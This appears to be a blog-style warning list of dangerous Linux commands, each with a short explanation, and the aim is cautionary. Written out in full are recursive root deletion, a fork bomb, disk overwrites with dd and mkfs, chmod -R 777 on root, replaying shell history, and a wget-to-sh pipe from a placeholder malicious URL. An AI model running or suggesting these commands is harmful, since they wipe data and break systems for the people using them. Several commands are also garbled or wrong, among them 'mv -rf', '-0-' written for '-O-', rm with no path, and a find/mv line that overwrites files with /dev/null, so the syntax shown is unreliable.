## Recursive Deletion
- This is one of the scariest commands. When you run this command, it deletes everything in the root directory forcibly and recursively. As a result, all of your directories and subdirectories will be deleted, and all of your data will be lost.

      sudo rm -rf --no-preserve-root

## Move everything to BlackHole
 - Everything that is moved to this location is destroyed.
As a result, if you accidentally move your data to this folder, it will not be recovered

        sudo find / -type f -exec mv /dev/null {} +

        or

        sudo mv -rf / /dev/null

## The fork bomb 🍴💣

 - This is my personal best, a simple bash recursive function that, when executed, creates copies of itself, which in turn creates another set of copies of itself. This takes up CPU time and memory. As a result, it loops until the system freezes.

       :(){:|:&};:

 - Fortunately, you can defend against this attack by limiting the number of processes run by users to around 4000.

You can accomplish this by issuing the following command:

    ulimit -S -u 4000

## Overwrite the hard drive ✍️💿

- This command writes raw data (command output) to the specified partition. This causes data loss on the hard drive or specified partition.

      sudo command > /dev/sda

## Blindly download and execute malicious script ☠️📜

- Wget and curl are useful Linux commands for retrieving and downloading files from the internet. However, if we blindly download and execute a malicious script, these commands can be dangerous.

      wget http://malicius_source_url -0- | sh

## Breach the System 🔓

- This command does not physically affect your system in the same way that the other commands do, but it does provide a security breach on the system.

      sudo chmod -R 777 /

## Unknowingly format a hard drive 🧹📀

- This command will erase your hard drive and recreate it.
These should only be used when you have a backup of your data on the cloud or an external device.

      mkfs.ext3 /dev/sda

## Write random junk to hard drive 🈳📀

- This command will write random garbage data to your hard drive.
Your system will not be recovered as a result of this command.

    sudo dd if=/dev/random of=/dev/sda

## Re-running all the history commands 🔁📜

- Because it executes every command from that you have already executed, the history | sh command can be dangerous. The action may cause system instability and the execution of commands that you do not want to repeat.

      sudo history | sh

## The ^foo^bar Command 📜

- The ^foo^bar command has the potential to be both helpful and dangerous. While the command saves time by allowing you to edit a previously run command and re-run it, it can also cause problems if you don't thoroughly check the changes you make before running it.

- The command changes the first occurrence of foo to bar.

      ^mv^rm -f ~/backups
